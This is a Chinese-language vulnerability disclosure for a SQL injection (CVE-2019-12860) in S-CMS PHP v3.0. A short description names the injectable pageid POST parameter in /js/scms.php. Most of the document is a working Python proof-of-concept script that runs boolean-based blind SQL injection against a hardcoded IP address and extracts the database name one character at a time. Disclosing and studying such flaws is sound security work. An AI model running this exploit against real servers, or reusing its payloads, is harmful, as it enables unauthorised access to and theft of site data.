### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|S-CMS PHP v3.0存在SQL注入漏洞|2019-05-31|zhhhy|[https://www.s-cms.cn/download.html?code=php](https://www.s-cms.cn/download.html?code=php) | [https://www.s-cms.cn/download.html?code=php](https://www.s-cms.cn/download.html?code=php) |PHP v3.0| [CVE-2019-12860](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12860)|  

#### 漏洞概述  

> 漏洞代码位置：/js/scms.php 第182-204行,在第83行处，变量$pageid接受使用POST方式传递的pageid的值。而在第87行和第95行处，变量$pageid被直接拼接进SQL语句之中，从而产生注入。而由于是数字型注入，避免使用单引号等符号以至于绕过了防御。   

### POC实现代码如下：  

> 构造如下poc.py  

``` python
import requests
import urllib.parse

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789'

url='http://106.14.144.32:2000/js/scms.php'

def getDatabaseLength():
    print('开始爆破数据库长度。。。')
    for i in range(10):
        payload="1%0Aand%0Aif(length(database())>{},1,0)#".format(i)
        payload=urllib.parse.unquote(payload)
        data = {
            'action':'jssdk',
            'pagetype':'text',
            'pageid':payload
        }
        # print(data)
        # data = urllib.parse.unquote(data)
        # print(data)
        rs = requests.post(url=url,data=data)
        rs.encode='utf-8'
        # print(rs.text)
        if "20151019102732946.jpg" not in rs.text:
            print("数据库名的长度为：{}".format(i))
            return i

def getDatabaseName():
    print('开始获取数据库名')
    databasename = ''

    length = getDatabaseLength()
    # length = 4
    for i in range(1,length+1):
        for c in chars:
            payload='1%0Aand%0Aif(ascii(substr(database(),{},1))={},1,0)#'.format(i,ord(c))
            # print(payload)
            payload = urllib.parse.unquote(payload)
            data = {
                'action': 'jssdk',
                'pagetype': 'text',
                'pageid': payload
            }
            rs = requests.post(url=url, data=data)
            rs.encode = 'utf-8'
            # print(rs.text)
            if "20151019102732946.jpg" in rs.text:
                databasename = databasename+c
                print(databasename)

    return databasename
getDatabaseName() 
```
### 漏洞详情：[PDF版详情](POC_Details/S-CMS%20PHP%20v30存在SQL注入漏洞.pdf)